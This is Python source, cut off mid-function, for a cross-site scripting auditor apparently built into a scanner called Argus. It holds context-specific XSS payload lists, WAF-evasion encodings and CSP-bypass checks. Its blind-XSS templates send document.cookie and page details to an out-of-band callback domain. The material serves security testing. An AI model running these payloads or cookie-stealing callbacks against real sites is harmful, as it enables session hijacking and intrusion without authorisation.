#!/usr/bin/env python3
"""
auditing_tools/xss_finder.py — Cross-Site Scripting Auditor
═══════════════════════════════════════════════════════════════════════════════

Comprehensive XSS detection for Argus.

XSS is not one bug class. It is four, and each needs a different oracle:

  1. Reflected XSS
     Input appears in the response. The question is not "did it reflect?"
     but "did it reflect unencoded, in a context where the browser will
     execute it?" The module answers that with a static HTML tokenizer that
     reconstructs the injection context at the reflection point.

  2. DOM XSS
     Input never touches the server. It flows from a browser source
     (location.hash, location.search, postMessage) to a dangerous sink
     (innerHTML, eval, document.write). Detected by static source-to-sink
     analysis over the JavaScript files already harvested by js_analysis.

  3. Stored XSS
     Input persists and renders on a later page. Detected by injecting a
     unique marker, then re-fetching listing and profile pages and checking
     whether the marker reappears unencoded.

  4. Blind XSS
     Execution happens in an admin panel you cannot see. Detected only by
     out-of-band callbacks. The module generates OOB payloads and writes
     them for manual deployment.

Detection model:

  Phase 1 — Reflection probe
      Send a unique alphanumeric marker through every parameter. Record
      whether and where it reflects.

  Phase 2 — Context classification
      Tokenize the HTML from the start of the response up to the reflection
      point. Reconstruct whether the marker landed in:
        html_body, attr_double, attr_single, attr_unquoted,
        script_string_double, script_string_single, script_template,
        script_bare, event_handler, url_attr, css, html_comment

  Phase 3 — Context-aware payloads
      For each context, send only the breakout payloads that can execute
      there. A `"><svg onload>` is useless inside a JS string; a `';alert()//`
      is useless in HTML body.

  Phase 4 — Encoding analysis
      For each reflection, measure whether < > " ' ` ( ) survived unencoded.
      A payload that survives fully unencoded in an executable context is
      the strongest possible signal short of a browser.

  Phase 5 — DOM source-to-sink
      Static analysis over JS files for 26 sources and 30 sinks.

  Phase 6 — Stored candidate generation
      Inject markers into form fields and URL parameters, re-fetch listing
      pages, check for reappearance.

  Phase 7 — Blind OOB payloads
      Generate payloads with an OOB callback for manual deployment.

  Phase 8 — WAF bypass
      When a payload is blocked (403/406/429), try 9 encoding transforms.

  Phase 9 — CSP analysis
      Parse Content-Security-Policy and flag bypass surfaces: unsafe-inline,
      unsafe-eval, wildcard, JSONP-friendly hosts, missing base-uri.

Honesty note:
  Without a headless browser, this module cannot prove JavaScript executed.
  It proves the payload SURVIVED UNENCODED in a context where a browser
  WOULD execute it. That is the same signal Burp Scanner and XSStrike use
  in their non-headless modes. If you need execution proof, pipe the
  confirmed candidates into a Playwright/Dalfox headless run.

Outputs (into `outdir`):
  • xss_findings.json        — full structured report
  • xss_candidates.txt       — flat list for triage
  • xss_confirmed.txt        — unencoded-survival findings
  • xss_dom.txt              — DOM source-to-sink findings
  • xss_blind.txt            — OOB payloads for manual deployment
  • xss_csp.txt              — CSP bypass surfaces

Integration:
  main.py → run_one("xss") → run_xss_scan(urls_file, outdir)
"""

from __future__ import annotations

import json
import logging
import random
import re
import statistics
import string
import sys
import time
import urllib.parse
from dataclasses import dataclass, field
from datetime import datetime, timezone
from pathlib import Path
from typing import Optional

import requests
import urllib3

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

log = logging.getLogger("argus.xss_finder")

# ═════════════════════════════════════════════════════════════════════════════
#  CONFIGURATION
# ═════════════════════════════════════════════════════════════════════════════

DEFAULT_TIMEOUT    = 12
USER_AGENT         = "Argus-XSS-Auditor/1.0"
REQUEST_SLEEP      = 0.08

BASELINE_SAMPLES   = 2
MAX_CONTEXT_PAYLOADS = 6          # per context, per parameter
MAX_DOM_FILES      = 40           # JS files to statically analyze
MAX_STORED_PAGES   = 15           # listing pages to re-fetch for stored

# Reflection marker
MARKER_PREFIX = "argusxss"

# ═════════════════════════════════════════════════════════════════════════════
#  CONTEXT-AWARE PAYLOADS
# ═════════════════════════════════════════════════════════════════════════════

# Each payload uses {m} as a unique alert marker so we can confirm survival
# without triggering a real dialog.
CONTEXT_PAYLOADS: dict[str, list[str]] = {
    "html_body": [
        "<svg onload=alert('{m}')>",
        "<img src=x onerror=alert('{m}')>",
        "<script>alert('{m}')</script>",
        "<details open ontoggle=alert('{m}')>",
        "<iframe srcdoc=\"<script>alert('{m}')</script>\">",
        "<math><mtext><table><mglyph><svg><mtext><textarea><path id=x></textarea><img src=x onerror=alert('{m}')>",
    ],
    "attr_double": [
        "\"><svg onload=alert('{m}')>",
        "\" onmouseover=\"alert('{m}')\" x=\"",
        "\" autofocus onfocus=\"alert('{m}')\" x=\"",
        "\"><img src=x onerror=alert('{m}')>",
        "\" onanimationstart=\"alert('{m}')\" style=\"animation:x\" x=\"",
        "\" onpointerover=\"alert('{m}')\" x=\"",
    ],
    "attr_single": [
        "'><svg onload=alert('{m}')>",
        "' onmouseover='alert(\"{m}\")' x='",
        "' autofocus onfocus='alert(\"{m}\")' x='",
        "'><img src=x onerror=alert('{m}')>",
    ],
    "attr_unquoted": [
        " onmouseover=alert('{m}') x=",
        " autofocus onfocus=alert('{m}') x=",
        " onanimationstart=alert('{m}') style=animation:x x=",
        "><svg onload=alert('{m}')>",
    ],
    "event_handler": [
        "alert('{m}')",
        "';alert('{m}')//",
        "\";alert('{m}')//",
        "alert('{m}')//",
    ],
    "script_string_double": [
        "\";alert('{m}')//",
        "\";alert('{m}')//",
        "\\\";alert('{m}')//",
        "</script><svg onload=alert('{m}')>",
    ],
    "script_string_single": [
        "';alert('{m}')//",
        "\\';alert('{m}')//",
        "</script><svg onload=alert('{m}')>",
    ],
    "script_template": [
        "${alert('{m}')}",
        "`;alert('{m}')//",
        "</script><svg onload=alert('{m}')>",
    ],
    "script_bare": [
        "alert('{m}')",
        ";alert('{m}')//",
        "*/alert('{m}')/*",
    ],
    "url_attr": [
        "javascript:alert('{m}')",
        "javascript:alert('{m}')//",
        "data:text/html,<script>alert('{m}')</script>",
        "&#106;avascript:alert('{m}')",
    ],
    "css": [
        "</style><svg onload=alert('{m}')>",
        "expression(alert('{m}'))",
        "}</style><svg onload=alert('{m}')>",
    ],
    "html_comment": [
        "--><svg onload=alert('{m}')>",
        "--!><svg onload=alert('{m}')>",
        "--><img src=x onerror=alert('{m}')>",
    ],
    "unknown": [
        "<svg onload=alert('{m}')>",
        "jaVasCript:/*-/*`/*\\`/*'/*\"/**/(/* */oNcliCk=alert('{m}'))//%0D%0A%0d%0a//</stYle/</titLe/</teXtarEa/</scRipt/--!>\\x3csVg/<sVg/oNloAd=alert('{m}')//>\\x3e",
    ],
}

# ── DOM XSS sources and sinks ──────────────────────────────────────────────
DOM_SOURCES = [
    "location.hash", "location.search", "location.href", "location.pathname",
    "document.URL", "document.documentURI", "document.referrer",
    "document.cookie", "window.name", "window.location",
    "document.baseURI", "history.state", "event.data",
    "localStorage", "sessionStorage", "IndexedDB",
    "postMessage", "WebSocket", "EventSource", "Worker",
    "URLSearchParams", "URL", "document.domain",
    "navigator.userAgent", "navigator.language", "screen.name",
]

DOM_SINKS = [
    "innerHTML", "outerHTML", "insertAdjacentHTML",
    "document.write", "document.writeln",
    "eval", "Function", "setTimeout", "setInterval",
    "location.href", "location.assign", "location.replace",
    "window.open", "element.setAttribute",
    "jQuery.html", "jQuery.append", "jQuery.prepend", "jQuery.after",
    "jQuery.before", "$.globalEval", "$.getScript",
    "v-html", "dangerouslySetInnerHTML", "ng-bind-html",
    "createContextualFragment", "Range.createContextualFragment",
    "execScript", "setImmediate", "insertRow",
    "src", "srcdoc", "href",
]

# ── WAF bypass transforms ──────────────────────────────────────────────────
def _waf_variants(payload: str) -> list[tuple[str, str]]:
    """Return (variant, label) pairs for WAF bypass."""
    variants: list[tuple[str, str]] = []

    # Case-mixed tags and attributes
    mixed = re.sub(
        r"\b(svg|img|script|alert|onload|onerror|onmouseover|onfocus)\b",
        lambda m: "".join(c.upper() if i % 2 else c.lower() for i, c in enumerate(m.group(0))),
        payload, flags=re.I,
    )
    if mixed != payload:
        variants.append((mixed, "case_mix"))

    # HTML entity encoding of quotes / brackets
    entity = payload.replace("'", "&#39;").replace('"', "&#34;").replace("<", "&#60;")
    if entity != payload:
        variants.append((entity, "html_entity"))

    # URL encoding
    variants.append((urllib.parse.quote(payload, safe=""), "url_encode"))

    # Double URL encoding
    variants.append((urllib.parse.quote(urllib.parse.quote(payload, safe=""), safe=""), "double_url_encode"))

    # Unicode escapes
    uni = payload.replace("a", "\\u0061").replace("l", "\\u006c").replace("e", "\\u0065")
    if uni != payload:
        variants.append((uni, "unicode_escape"))

    # Null byte / newline injection between tag and attribute
    nl = payload.replace(" ", "%0a")
    if nl != payload:
        variants.append((nl, "newline_inject"))

    # Backtick attribute (works in some parsers)
    bt = payload.replace('="', "=`").replace('"', "`")
    if bt != payload:
        variants.append((bt, "backtick_attr"))

    # Comment break inside tag
    cb = payload.replace("<svg", "<svg/**/").replace("<img", "<img/**/")
    if cb != payload:
        variants.append((cb, "comment_break"))

    # Chunked tag name (rarely blocked, often parsed)
    chunk = payload.replace("<svg", "<s\\x76g").replace("<img", "<i\\x6dg")
    if chunk != payload:
        variants.append((chunk, "chunked_tag"))

    return variants


# ═════════════════════════════════════════════════════════════════════════════
#  DATA MODELS
# ═════════════════════════════════════════════════════════════════════════════

@dataclass
class Baseline:
    url: str
    param: str
    status: int = 0
    length: int = 0
    body: str = ""
    content_type: str = ""
    median_time: float = 0.0

    def to_dict(self) -> dict:
        return {
            "url": self.url, "param": self.param, "status": self.status,
            "length": self.length, "median_time": round(self.median_time, 3),
        }


@dataclass
class XSSFinding:
    target: str
    param: str
    xss_type: str               # reflected | stored | dom | blind
    context: str = ""           # html_body | attr_double | ...
    severity: str = "MEDIUM"
    confidence: int = 50
    payload: str = ""
    marker: str = ""
    evidence: str = ""
    bypass_used: str = ""
    encoded_chars: list[str] = field(default_factory=list)
    survived_chars: list[str] = field(default_factory=list)
    details: dict = field(default_factory=dict)

    def to_dict(self) -> dict:
        return {
            "target":         self.target,
            "param":          self.param,
            "xss_type":       self.xss_type,
            "context":        self.context,
            "severity":       self.severity,
            "confidence":     self.confidence,
            "payload":        self.payload[:500],
            "marker":         self.marker,
            "evidence":       self.evidence[:500],
            "bypass_used":    self.bypass_used,
            "encoded_chars":  self.encoded_chars,
            "survived_chars": self.survived_chars,
            "details":        self.details,
        }


# ═════════════════════════════════════════════════════════════════════════════
#  UTILITIES
# ═════════════════════════════════════════════════════════════════════════════

def _load_urls(input_file: Path) -> list[str]:
    if not input_file.exists():
        return []
    urls: list[str] = []
    seen: set[str] = set()
    for line in input_file.read_text().splitlines():
        line = line.strip()
        if not line or line.startswith("#"):
            continue
        token = line.split()[0]
        if not token.startswith(("http://", "https://")):
            token = "https://" + token
        if token not in seen:
            seen.add(token)
            urls.append(token)
    return urls


def _extract_surface(url: str) -> list[tuple[str, str]]:
    parsed = urllib.parse.urlparse(url)
    params = urllib.parse.parse_qs(parsed.query)
    return [(p, vals[0] if vals else "") for p, vals in params.items()]


def _inject_query(url: str, param: str, payload: str) -> str:
    parsed = urllib.parse.urlparse(url)
    params = urllib.parse.parse_qsl(parsed.query, keep_blank_values=True)
    new = [(k, payload if k == param else v) for k, v in params]
    return urllib.parse.urlunparse(
        parsed._replace(query=urllib.parse.urlencode(new, safe=":/?=&%{}<>*#$@'\"`()[]"))
    )


def _safe_request(
    session: requests.Session, method: str, url: str,
    headers: Optional[dict] = None, timeout: int = DEFAULT_TIMEOUT,
) -> Optional[requests.Response]:
    try:
        return session.request(
            method, url, headers=headers or {},
            timeout=timeout, allow_redirects=False, verify=False,
        )
    except requests.RequestException as e:
        log.debug(f"request failed: {method} {url}: {e}")
        return None


def _body(resp: requests.Response, limit: int = 500_000) -> str:
    try:
        return resp.text[:limit]
    except Exception:
        return ""


def _new_marker() -> str:
    return MARKER_PREFIX + "".join(random.choices(string.ascii_lowercase + string.digits, k=10))


# ═════════════════════════════════════════════════════════════════════════════
#  PHASE 1 — REFLECTION PROBE
# ═════════════════════════════════════════════════════════════════════════════

def build_baseline(session: requests.Session, url: str, param: str) -> Baseline:
    baseline = Baseline(url=url, param=param)
    times: list[float] = []

    for _ in range(BASELINE_SAMPLES):
        start = time.monotonic()
        resp = _safe_request(session, "GET", url)
        elapsed = time.monotonic() - start
        times.append(elapsed)
        if resp is None:
            continue
        if not baseline.status:
            baseline.status = resp.status_code
            baseline.body = _body(resp)
            baseline.length = len(baseline.body)
            baseline.content_type = resp.headers.get("Content-Type", "")
        time.sleep(REQUEST_SLEEP)

    if times:
        baseline.median_time = statistics.median(times)
    return baseline


def probe_reflection(
    session: requests.Session, url: str, param: str, baseline: Baseline,
) -> dict:
    """
    Send a unique alphanumeric marker. Return reflection metadata:
      reflected: bool
      index: position in body
      marker: the marker
      unencoded: whether the marker appears verbatim (not HTML-encoded)
    """
    marker = _new_marker()
    test_url = _inject_query(url, param, marker)
    resp = _safe_request(session, "GET", test_url)
    time.sleep(REQUEST_SLEEP)

    result = {"reflected": False, "index": -1, "marker": marker, "unencoded": False}
    if resp is None:
        return result

    body = _body(resp)
    idx = body.find(marker)
    if idx >= 0:
        result["reflected"] = True
        result["index"] = idx
        result["unencoded"] = True
    else:
        # Check for HTML-encoded form
        encoded = marker.replace("a", "&#97;")  # cheap check
        if encoded in body:
            result["reflected"] = True
            result["unencoded"] = False

    return result


# ═════════════════════════════════════════════════════════════════════════════
#  PHASE 2 — CONTEXT CLASSIFICATION (HTML tokenizer)
# ═════════════════════════════════════════════════════════════════════════════

def classify_context(body: str, index: int) -> str:
    """
    Tokenize the HTML from the beginning up to `index` and determine the
    injection context.

    Returns one of:
      html_body, html_comment, attr_double, attr_single, attr_unquoted,
      event_handler, url_attr, script_string_double, script_string_single,
      script_template, script_bare, css, style, unknown
    """
    if index < 0 or index >= len(body):
        return "unknown"

    prefix = body[:index]

    in_comment = False
    in_script = False
    in_style = False
    in_tag = False
    tag_name = ""
    quote = ""
    last_attr = ""
    in_js_string = ""        # "", "'", '"', "`"
    js_escape = False

    i = 0
    n = len(prefix)
    while i < n:
        ch = prefix[i]

        # ── Inside HTML comment ─────────────────────────────────────────────
        if in_comment:
            if prefix.startswith("-->", i):
                in_comment = False
                i += 3
                continue
            i += 1
            continue

        # ── Inside script / style ───────────────────────────────────────────
        if in_script:
            if prefix.startswith("</script", i):
                in_script = False
                i += 8
                continue
            if in_style:
                if prefix.startswith("</style", i):
                    in_style = False
                    in_script = False
                    i += 7
                    continue
                i += 1
                continue
            # JS string tracking
            if js_escape:
                js_escape = False
                i += 1
                continue
            if ch == "\\":
                js_escape = True
                i += 1
                continue
            if in_js_string:
                if ch == in_js_string:
                    in_js_string = ""
                i += 1
                continue
            if ch in ("'", '"', "`"):
                in_js_string = ch
                i += 1
                continue
            i += 1
            continue

        # ── Inside a tag (attributes) ───────────────────────────────────────
        if in_tag:
            if quote:
                if ch == quote:
                    quote = ""
                i += 1
                continue
            if ch in ("'", '"'):
                quote = ch
                i += 1
                continue
            if ch == ">":
                in_tag = False
                tag_name = ""
                last_attr = ""
                i += 1
                continue
            # Track attribute name
            if ch.isalpha() or ch == "-":
                j = i
                while j < n and (prefix[j].isalnum() or prefix[j] in "-_"):
                    j += 1
                last_attr = prefix[i:j].lower()
                i = j
                continue
            i += 1
            continue

        # ── Outside any tag ─────────────────────────────────────────────────
        if prefix.startswith("<!--", i):
            in_comment = True
            i += 4
            continue
        if prefix.startswith("<script", i):
            in_script = True
            i += 7
            # Skip to end of tag
            gt = prefix.find(">", i)
            i = (gt + 1) if gt >= 0 else n
            continue
        if prefix.startswith("<style", i):
            in_script = True
            in_style = True
            i += 6
            gt = prefix.find(">", i)
            i = (gt + 1) if gt >= 0 else n
            continue
        if ch == "<":
            in_tag = True
            tag_name = ""
            last_attr = ""
            i += 1
            # Read tag name
            j = i
            while j < n and (prefix[j].isalnum() or prefix[j] in "-:"):
                j += 1
            tag_name = prefix[i:j].lower()
            i = j
            continue
        i += 1

    # ── Determine context at the reflection point ──────────────────────────
    if in_comment:
        return "html_comment"
    if in_script and in_style:
        return "css"
    if in_script:
        if in_js_string == "`":
            return "script_template"
        if in_js_string == "'":
            return "script_string_single"
        if in_js_string == '"':
            return "script_string_double"
        return "script_bare"
    if in_tag:
        if quote == '"':
            # Check if this attribute is a URL-bearing one
            if last_attr in ("href", "src", "action", "formaction", "data"):
                return "url_attr"
            if last_attr.startswith("on"):
                return "event_handler"
            return "attr_double"
        if quote == "'":
            if last_attr in ("href", "src", "action", "formaction", "data"):
                return "url_attr"
            if last_attr.startswith("on"):
                return "event_handler"
            return "attr_single"
        return "attr_unquoted"

    return "html_body"


# ═════════════════════════════════════════════════════════════════════════════
#  PHASE 3 + 4 — CONTEXT-AWARE PAYLOADS & ENCODING ANALYSIS
# ═════════════════════════════════════════════════════════════════════════════

ENCODING_CHARS = ["<", ">", '"', "'", "`", "(", ")"]

ENCODED_FORMS = {
    "<":  ["&lt;", "&#60;", "&#x3c;", "%3c", "\\u003c"],
    ">":  ["&gt;", "&#62;", "&#x3e;", "%3e", "\\u003e"],
    '"':  ["&quot;", "&#34;", "&#x22;", "%22", '\\"'],
    "'":  ["&#39;", "&#x27;", "%27", "\\'", "&apos;"],
    "`":  ["&#96;", "&#x60;", "%60", "\\`"],
    "(":  ["&#40;", "&#x28;", "%28", "\\u0028"],
    ")":  ["&#41;", "&#x29;", "%29", "\\u0029"],
}


def analyze_encoding(body: str, index: int, payload: str) -> tuple[list[str], list[str]]:
    """
    At the reflection point, check which dangerous characters survived
    unencoded and which were neutralized.
    Returns (encoded_chars, survived_chars).
    """
    if index < 0:
        return [], []

    # Look at a window around the reflection
    window = body[max(0, index - 50): index + len(payload) + 50]
    encoded: list[str] = []
    survived: list[str] = []

    for ch in ENCODING_CHARS:
        if ch in payload:
            # Did the payload's ch survive literally in the window?
            if ch in window:
                survived.append(ch)
            # Was a known encoded form present?
            for form in ENCODED_FORMS.get(ch, []):
                if form.lower() in window.lower():
                    encoded.append(ch)
                    break

    return encoded, survived


def test_context_payloads(
    session: requests.Session,
    url: str, param: str, baseline: Baseline,
    context: str,
) -> list[XSSFinding]:
    """Send context-appropriate payloads and analyze survival."""
    findings: list[XSSFinding] = []

    payloads = CONTEXT_PAYLOADS.get(context) or CONTEXT_PAYLOADS["unknown"]
    payloads = payloads[:MAX_CONTEXT_PAYLOADS]

    for template in payloads:
        marker = _new_marker()
        payload = template.format(m=marker)
        test_url = _inject_query(url, param, payload)
        resp = _safe_request(session, "GET", test_url)
        time.sleep(REQUEST_SLEEP)

        if resp is None:
            continue

        body = _body(resp)
        idx = body.find(payload)

        # ── Exact payload survived ──────────────────────────────────────────
        if idx >= 0:
            encoded, survived = analyze_encoding(body, idx, payload)
            # A payload that survives with () and either quote or < > is a
            # strong signal — the browser will parse it.
            executable = (
                "(" in survived and ")" in survived
                and any(c in survived for c in ("<", '"', "'", "`"))
            )
            confidence = 92 if executable else 70
            severity = "CRITICAL" if executable else "HIGH"

            findings.append(XSSFinding(
                target=url, param=param, xss_type="reflected",
                context=context, severity=severity, confidence=confidence,
                payload=payload, marker=marker,
                evidence=(
                    f"Payload survived UNENCODED in {context} context — "
                    f"survived chars: {''.join(survived) or '(none)'}"
                ),
                encoded_chars=encoded, survived_chars=survived,
                details={
                    "reflection_index": idx,
                    "context": context,
                    "executable": executable,
                    "body_snippet": body[max(0, idx - 80): idx + len(payload) + 80],
                },
            ))
            return findings

        # ── Marker present but payload broken up ────────────────────────────
        midx = body.find(marker)
        if midx >= 0:
            encoded, survived = analyze_encoding(body, midx, payload)
            # If the marker survived but the payload did not, the context
            # is right but the breakout was filtered — adjust next payload.
            findings.append(XSSFinding(
                target=url, param=param, xss_type="reflected",
                context=context, severity="MEDIUM", confidence=55,
                payload=payload, marker=marker,
                evidence=f"Marker reflected in {context} but payload was filtered/modified",
                encoded_chars=encoded, survived_chars=survived,
                details={"body_snippet": body[max(0, midx - 80): midx + 120]},
            ))
            return findings

        # ── WAF block? Try bypass variants ──────────────────────────────────
        if resp.status_code in (403, 406, 429, 501):
            for variant, label in _waf_variants(payload):
                v_url = _inject_query(url, param, variant)
                v_resp = _safe_request(session, "GET", v_url)
                time.sleep(REQUEST_SLEEP)
                if v_resp is None:
                    continue
                v_body = _body(v_resp)
                v_idx = v_body.find(variant)
                if v_idx >= 0:
                    encoded, survived = analyze_encoding(v_body, v_idx, variant)
                    findings.append(XSSFinding(
                        target=url, param=param, xss_type="reflected",
                        context=context, severity="HIGH", confidence=80,
                        payload=variant, marker=marker, bypass_used=label,
                        evidence=f"WAF bypass '{label}' survived unencoded in {context}",
                        encoded_chars=encoded, survived_chars=survived,
                        details={"original_payload": payload, "variant": variant},
                    ))
                    return findings

    return findings


# ═════════════════════════════════════════════════════════════════════════════
#  PHASE 5 — DOM XSS STATIC ANALYSIS
# ═════════════════════════════════════════════════════════════════════════════

def analyze_dom_js(js_url: str, js_content: str, target_page: str) -> list[XSSFinding]:
    """
    Static source-to-sink analysis over one JS file.
    Flags files where a source feeds a sink within a 15-line window.
    """
    findings: list[XSSFinding] = []
    if not js_content:
        return findings

    lines = js_content.splitlines()

    # Find lines containing sources and sinks
    source_lines: dict[str, list[int]] = {}
    sink_lines: dict[str, list[int]] = {}
    for i, line in enumerate(lines):
        for src in DOM_SOURCES:
            if src in line:
                source_lines.setdefault(src, []).append(i)
        for sink in DOM_SINKS:
            if sink in line:
                sink_lines.setdefault(sink, []).append(i)

    if not source_lines or not sink_lines:
        return findings

    # Check for proximity (data flow heuristic)
    for src, src_positions in source_lines.items():
        for sink, sink_positions in sink_lines.items():
            for sp in src_positions:
                for kp in sink_positions:
                    if abs(sp - kp) <= 15:
                        confidence = 75 if abs(sp - kp) <= 5 else 60
                        findings.append(XSSFinding(
                            target=target_page, param="(DOM)",
                            xss_type="dom", context="dom",
                            severity="HIGH" if confidence >= 75 else "MEDIUM",
                            confidence=confidence,
                            payload=f"{src} → {sink}",
                            evidence=f"Source '{src}' flows to sink '{sink}' within {abs(sp - kp)} lines in {js_url}",
                            details={
                                "js_url": js_url,
                                "source": src,
                                "sink": sink,
                                "source_line": sp + 1,
                                "sink_line": kp + 1,
                                "snippet": lines[max(0, min(sp, kp) - 2): max(sp, kp) + 3],
                            },
                        ))
                        # One finding per (src, sink) pair is enough
                        break
                else:
                    continue
                break

    return findings


def discover_js_for_dom(outdir: Path) -> list[Path]:
    """Find JS files in output that can be analyzed for DOM XSS."""
    candidates: list[Path] = []
    for name in ("urls_js_files.txt", "js_files.txt"):
        p = outdir / name
        if p.exists():
            candidates.append(p)
    return candidates


def run_dom_analysis(session: requests.Session, outdir: Path) -> list[XSSFinding]:
    """
    Download JS files from the harvested list and run source-to-sink analysis.
    """
    findings: list[XSSFinding] = []
    js_urls: list[str] = []

    for p in discover_js_for_dom(outdir):
        for line in p.read_text().splitlines():
            url = line.strip().split()[0] if line.strip() else ""
            if url and url.endswith(".js") and url not in js_urls:
                js_urls.append(url)
                if len(js_urls) >= MAX_DOM_FILES:
                    break
        if len(js_urls) >= MAX_DOM_FILES:
            break

    if not js_urls:
        return findings

    log.info(f"    DOM analysis: {len(js_urls)} JS file(s)")

    for js_url in js_urls:
        resp = _safe_request(session, "GET", js_url, timeout=15)
        time.sleep(REQUEST_SLEEP)
        if resp is None or resp.status_code >= 400:
            continue
        content = _body(resp, limit=2_000_000)
        if not content:
            continue
        dom_findings = analyze_dom_js(js_url, content, js_url)
        findings.extend(dom_findings)

    return findings


# ═════════════════════════════════════════════════════════════════════════════
#  PHASE 6 — STORED XSS CANDIDATE GENERATION
# ═════════════════════════════════════════════════════════════════════════════

STORED_REVISIT_PATTERNS = [
    "/", "/profile", "/account", "/dashboard", "/settings",
    "/comments", "/messages", "/posts", "/feed", "/notifications",
    "/admin", "/admin/users", "/support", "/tickets",
]


def run_stored_candidates(
    session: requests.Session,
    url: str, param: str, baseline: Baseline,
) -> list[XSSFinding]:
    """
    Inject a unique marker, then re-fetch listing pages on the same host and
    check whether the marker reappears. This is the stored-XSS oracle.

    The module does NOT submit forms — it only tests URL parameters, because
    form submission requires field discovery and could create persistent
    state on the target. Form-based stored XSS is a manual test.
    """
    findings: list[XSSFinding] = []
    marker = _new_marker()

    # Inject the marker
    test_url = _inject_query(url, param, marker)
    resp = _safe_request(session, "GET", test_url)
    time.sleep(REQUEST_SLEEP)
    if resp is None:
        return findings

    # Re-fetch listing pages and look for the marker
    parsed = urllib.parse.urlparse(url)
    base = f"{parsed.scheme}://{parsed.netloc}"

    for path in STORED_REVISIT_PATTERNS:
        test_url = base + path
        r = _safe_request(session, "GET", test_url)
        time.sleep(REQUEST_SLEEP)
        if r is None or r.status_code >= 400:
            continue
        body = _body(r)
        idx = body.find(marker)
        if idx >= 0:
            context = classify_context(body, idx)
            findings.append(XSSFinding(
                target=test_url, param=param, xss_type="stored",
                context=context, severity="CRITICAL", confidence=80,
                payload=marker, marker=marker,
                evidence=f"Injected marker reappeared on {test_url} after submission via {param}",
                details={
                    "injection_url": url,
                    "revisit_url": test_url,
                    "context": context,
                    "body_snippet": body[max(0, idx - 80): idx + 120],
                },
            ))
            return findings

    return findings


# ═════════════════════════════════════════════════════════════════════════════
#  PHASE 7 — BLIND XSS PAYLOADS
# ═════════════════════════════════════════════════════════════════════════════

BLIND_PAYLOAD_TEMPLATE = (
    "<script>new Image().src='{oob}/b?d='+encodeURIComponent(document.domain)+"
    "'&c='+encodeURIComponent(document.cookie)+'&u='+encodeURIComponent(location.href);</script>"
)

BLIND_PAYLOADS_ALT = [
    "<script src='{oob}'></script>",
    "<img src='{oob}' onerror=\"fetch('{oob}?c='+document.cookie)\">",
    "<svg onload=\"fetch('{oob}?c='+document.cookie)\">",
]


def generate_blind_payloads(url: str, param: str, oob_domain: Optional[str]) -> list[dict]:
    """Generate blind XSS payloads for manual deployment."""
    if not oob_domain:
        return []
    token = _new_marker()
    oob_url = f"https://{token}.{oob_domain}"
    payloads = [BLIND_PAYLOAD_TEMPLATE.format(oob=oob_url)]
    payloads.extend(p.format(oob=oob_url) for p in BLIND_PAYLOADS_ALT)

    return [
        {
            "target": url,
            "param": param,
            "payload": p,
            "oob_url": oob_url,
            "token": token,
            "deployment": "Inject into form fields, headers, and profile data",
        }
        for p in payloads
    ]


# ═════════════════════════════════════════════════════════════════════════════
#  PHASE 9 — CSP ANALYSIS
# ═════════════════════════════════════════════════════════════════════════════

CSP_BYPASS_HOSTS = [
    "ajax.googleapis.com", "cdnjs.cloudflare.com", "cdn.jsdelivr.net",
    "unpkg.com", "code.jquery.com", "maxcdn.bootstrapcdn.com",
    "stackpath.bootstrapcdn.com", "www.google.com", "accounts.google.com",
]


def analyze_csp(resp: requests.Response, target: str) -> list[dict]:
    """Parse CSP and flag bypass surfaces."""
    surfaces: list[dict] = []
    csp = resp.headers.get("Content-Security-Policy", "")
    if not csp:
        return surfaces

    lower = csp.lower()
    if "unsafe-inline" in lower:
        surfaces.append({
            "target": target, "surface": "unsafe-inline",
            "severity": "HIGH",
            "evidence": "CSP allows 'unsafe-inline' — inline scripts execute",
        })
    if "unsafe-eval" in lower:
        surfaces.append({
            "target": target, "surface": "unsafe-eval",
            "severity": "HIGH",
            "evidence": "CSP allows 'unsafe-eval' — eval() and Function() execute",
        })
    if "script-src *" in lower or "script-src: *" in lower:
        surfaces.append({
            "target": target, "surface": "wildcard_script_src",
            "severity": "HIGH",
            "evidence": "script-src allows wildcard — any host can serve scripts",
        })
    for host in CSP_BYPASS_HOSTS:
        if host in csp:
            surfaces.append({
                "target": target, "surface": f"jsonp_host:{host}",
                "severity": "MEDIUM",
                "evidence": f"script-src allowlists {host} — JSONP endpoints on this host bypass CSP",
            })
    if "base-uri" not in lower:
        surfaces.append({
            "target": target, "surface": "missing_base_uri",
            "severity": "MEDIUM",
            "evidence": "CSP does not set base-uri — <base> tag injection can redirect relative scripts",
        })
    if "object-src" not in lower:
        surfaces.append({
            "target": target, "surface": "missing_object_src",
            "severity": "MEDIUM",
            "evidence": "CSP does not set object-src — plugin-based script execution possible",
        })

    return surfaces


# ═════════════════════════════════════════════════════════════════════════════
#  PER-SURFACE ORCHESTRATION
# ═════════════════════════════════════════════════════════════════════════════

def audit_surface(
    session: requests.Session,
    url: str, param: str,
    *,
    test_stored: bool = True,
    oob_domain: Optional[str] = None,
) -> tuple[Baseline, list[XSSFinding], Optional[dict]]:
    baseline = build_baseline(session, url, param)
    findings: list[XSSFinding] = []

    # ── Phase 1: reflection probe ──────────────────────────────────────────
    reflection = probe_reflection(session, url, param, baseline)
    if not reflection["reflected"]:
        return baseline, findings, None

    # ── Phase 2: context classification ────────────────────────────────────
    # Use the payload probe to get the actual context
    marker = reflection["marker"]
    test_url = _inject_query(url, param, marker)
    resp = _safe_request(session, "GET", test_url)
    time.sleep(REQUEST_SLEEP)
    if resp is None:
        return baseline, findings, None
    body = _body(resp)
    idx = body.find(marker)
    context = classify_context(body, idx) if idx >= 0 else "unknown"

    # ── Phase 3 + 4: context-aware payloads ────────────────────────────────
    ctx_findings = test_context_payloads(session, url, param, baseline, context)
    findings.extend(ctx_findings)

    # ── Phase 6: stored candidate ──────────────────────────────────────────
    if test_stored:
        stored = run_stored_candidates(session, url, param, baseline)
        findings.extend(stored)

    # ── Phase 7: blind payload generation ──────────────────────────────────
    blind_payloads = generate_blind_payloads(url, param, oob_domain)

    reflection_info = {
        "marker": marker,
        "context": context,
        "unencoded": reflection["unencoded"],
        "blind_payloads": blind_payloads,
    }
    return baseline, findings, reflection_info


# ═════════════════════════════════════════════════════════════════════════════
#  PUBLIC ENTRY POINT
# ═════════════════════════════════════════════════════════════════════════════

def run_xss_scan(
    urls_file: Path,
    outdir: Path,
    *,
    headers: Optional[dict] = None,
    oob_domain: Optional[str] = None,
    test_stored: bool = True,
    test_dom: bool = True,
    max_surfaces: int = 400,
) -> Path:
    start = time.monotonic()

    urls = _load_urls(urls_file)
    surfaces: list[tuple[str, str]] = []
    for url in urls:
        for param, _ in _extract_surface(url):
